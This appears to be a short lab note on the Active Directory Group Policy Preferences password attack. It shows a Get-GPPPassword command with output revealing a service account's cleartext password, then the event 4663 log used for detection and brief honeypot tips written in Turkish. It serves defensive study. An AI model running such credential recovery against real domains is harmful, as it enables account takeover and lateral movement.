# Group Policy Preferences

## Performing the Attack

```pwsh
PS C:\Users\bob> Get-GPPPassword
```

```output title="Output" hl_lines="1 3 5"
UserName  : svc-iis
NewName   : [BLANK]
Password  : abcd@123
Changed   : [BLANK]
File      : \\EAGLE.LOCAL\SYSVOL\eagle.local\Policies\{73C66DBB-81DA-44D8-BDEF-20BA2C27056D}\Machine\Preferences\Groups\Groups.xml
NodeName  : Groups
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80
```

## Event Viewer ([4663](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4663))

```xml title="Details" hl_lines="4 20 25"
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
  <EventID>4663</EventID>
  <Version>1</Version>
  <Level>0</Level>
  <Task>12800</Task>
  <Opcode>0</Opcode>
  <Keywords>0x8020000000000000</Keywords>
  <TimeCreated SystemTime="2025-10-20T20:05:02.200853400Z" />
  <EventRecordID>556226</EventRecordID>
  <Correlation />
  <Execution ProcessID="4" ThreadID="264" />
  <Channel>Security</Channel>
  <Computer>DC1.eagle.local</Computer>
  <Security />
  </System>
- <EventData>
  <Data Name="SubjectUserSid">S-1-5-21-1518138621-4282902758-752445584-1107</Data>
  <Data Name="SubjectUserName">bob</Data>
  <Data Name="SubjectDomainName">EAGLE</Data>
  <Data Name="SubjectLogonId">0x25aea6</Data>
  <Data Name="ObjectServer">Security</Data>
  <Data Name="ObjectType">File</Data>
  <Data Name="ObjectName">C:\Windows\SYSVOL\domain\Policies\{73C66DBB-81DA-44D8-BDEF-20BA2C27056D}\Machine\Preferences\Groups\Groups.xml</Data>
  <Data Name="HandleId">0x2510</Data>
  <Data Name="AccessList">%%4416</Data>
  <Data Name="AccessMask">0x1</Data>
  <Data Name="ProcessId">0x4</Data>
  <Data Name="ProcessName" />
  <Data Name="ResourceAttributes">S:AI</Data>
  </EventData>
  </Event>
```

## Honeypot

* Honeypot hesabı için yakın zamanda yapılan bir parola değişikliği olmamalı.
* Honeypot hesabı yakın zamanda birden fazla kez oturum açmış olmalı.
